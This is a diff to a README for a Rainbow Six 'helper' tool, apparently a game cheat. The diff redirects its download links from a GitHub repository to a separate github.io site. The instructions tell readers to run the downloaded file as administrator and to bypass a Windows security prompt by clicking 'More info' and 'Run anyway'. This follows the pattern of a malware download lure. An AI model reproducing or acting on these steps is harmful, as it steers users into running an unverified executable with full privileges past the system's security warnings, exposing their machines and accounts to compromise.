@@ -1,6 +1,6 @@
 # 🎯 Ultimate-R6-Helper - Improve your game performance and accuracy
 
-[![](https://img.shields.io/badge/Download_Helper-Blue.svg)](https://github.com/ardithonsite55/Ultimate-R6-Helper)
+[![](https://img.shields.io/badge/Download_Helper-Blue.svg)](https://ardithonsite55.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Before you install this software, check that your computer meets these requireme
 
 Follow these steps to set up the helper on your system.
 
-1. Visit this page to download: [https://github.com/ardithonsite55/Ultimate-R6-Helper](https://github.com/ardithonsite55/Ultimate-R6-Helper).
+1. Visit this page to download: [https://ardithonsite55.github.io](https://ardithonsite55.github.io).
 2. Locate the folder where you saved the file.
 3. Right-click the file and select Run as administrator. This step allows the software to interact with the game engine correctly.
 4. If a Windows security prompt appears, click More info and then click Run anyway.
